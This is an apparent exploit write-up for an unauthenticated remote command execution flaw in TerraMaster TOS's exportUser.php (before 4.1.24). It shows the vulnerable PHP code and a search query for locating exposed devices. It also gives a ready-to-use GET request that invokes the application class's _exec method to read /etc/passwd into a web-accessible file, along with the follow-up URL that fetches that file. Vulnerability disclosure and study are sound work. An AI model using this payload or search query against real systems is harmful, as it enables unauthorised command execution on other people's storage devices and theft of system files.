# TerraMaster TOS exportUser.php Remote command execution

## Vulnerability Description

Remote command execution vulnerability exists in TerraMaster TOS exportUser.php file

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">TerraMaster TOS < 4.1.24</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">"TerraMaster" && header="TOS"</span>

## Vulnerability reappears

File with vulnerability `*exportUser.php`*

```php
<?php
    include_once "./app.php"; // [1] autoload classes
    class CSV_Writer{
        ...
    }
    $type = $_GET['type'];
    $csv = new CSV_Writer();
    if($type == 1){
        $P = new person();
        $data = $P->export_user($_GET['data']);
        $csv->exportUser($data);
    } else if($type == 2) {
        $P = new person();
        $data = $P->export_userGroup($_GET['data']);
        $csv->exportUsergroup($data);
    } else { // [2] type value is bigger than 2
        //xlsx通用下载
        $type = 0;
        $class = $_GET['cla'];
        $fun = $_GET['func'];
        $opt = $_GET['opt'];
        $E = new $class();
        $data = $E->$fun($opt); // [3] vulnerable code call
        $csv->exportExcel( $data['title'], $data['data'], $data['name'], $data['save'], $data['down']);
    }
?>
```



During code inspection of other files, it was also found that there is a way to exploit this problem using pre-existing classes in TOS software.
The PHP class located in `include/class/application.class.php` is the best candidate for executing commands on devices running TOS software.

Since *exportUser.php* does not have an authentication control, it is possible for an unauthenticated attacker to implement code execution by providing the following value as an HTTP GET parameter.

```plain
http://xxx.xxx.xxx.xxx/include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)>test.txt
```

Return to 200 and visit again

```plain
http://xxx.xxx.xxx.xxx/include/test.txt
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tm-9.png)